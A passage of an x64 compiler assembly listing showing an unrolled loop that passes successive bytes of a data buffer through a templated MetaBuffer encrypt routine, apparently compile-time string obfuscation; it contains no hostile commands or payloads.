	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	b8 01 00 00 00	 mov	 eax, 1
  003cf	48 6b c0 16	 imul	 rax, rax, 22
  003d3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003da	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003e5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  003ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003f1	88 41 17	 mov	 BYTE PTR [rcx+23], al
  003f4	b8 01 00 00 00	 mov	 eax, 1
  003f9	48 6b c0 17	 imul	 rax, rax, 23
  003fd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00404	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00408	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0040f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00414	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0041b	88 41 18	 mov	 BYTE PTR [rcx+24], al
  0041e	b8 01 00 00 00	 mov	 eax, 1
  00423	48 6b c0 18	 imul	 rax, rax, 24
  00427	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0042e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00432	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00439	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0043e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00445	88 41 19	 mov	 BYTE PTR [rcx+25], al
  00448	b8 01 00 00 00	 mov	 eax, 1
  0044d	48 6b c0 19	 imul	 rax, rax, 25
  00451	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00458	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0045c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00463	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00468	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0046f	88 41 1a	 mov	 BYTE PTR [rcx+26], al
  00472	b8 01 00 00 00	 mov	 eax, 1
  00477	48 6b c0 1a	 imul	 rax, rax, 26
  0047b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00482	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00486	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0048d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00492	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00499	88 41 1b	 mov	 BYTE PTR [rcx+27], al
  0049c	b8 01 00 00 00	 mov	 eax, 1
  004a1	48 6b c0 1b	 imul	 rax, rax, 27
  004a5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004ac	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004b7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  004bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004c3	88 41 1c	 mov	 BYTE PTR [rcx+28], al
  004c6	b8 01 00 00 00	 mov	 eax, 1
  004cb	48 6b c0 1c	 imul	 rax, rax, 28
  004cf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004d6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004e1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  004e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004ed	88 41 1d	 mov	 BYTE PTR [rcx+29], al
  004f0	b8 01 00 00 00	 mov	 eax, 1
  004f5	48 6b c0 1d	 imul	 rax, rax, 29
  004f9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00500	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00504	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0050b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00510	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00517	88 41 1e	 mov	 BYTE PTR [rcx+30], al
  0051a	b8 01 00 00 00	 mov	 eax, 1
  0051f	48 6b c0 1e	 imul	 rax, rax, 30
  00523	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0052a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0052e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00535	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0053a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00541	88 41 1f	 mov	 BYTE PTR [rcx+31], al
  00544	b8 01 00 00 00	 mov	 eax, 1
  00549	48 6b c0 1f	 imul	 rax, rax, 31
  0054d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00554	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00558	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0055f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00564	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0056b	88 41 20	 mov	 BYTE PTR [rcx+32], al
  0056e	b8 01 00 00 00	 mov	 eax, 1
  00573	48 6b c0 20	 imul	 rax, rax, 32		; 00000020H
  00577	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0057e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00582	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00589	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0058e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00595	88 41 21	 mov	 BYTE PTR [rcx+33], al
  00598	b8 01 00 00 00	 mov	 eax, 1
  0059d	48 6b c0 21	 imul	 rax, rax, 33		; 00000021H
  005a1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005a8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005b3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned 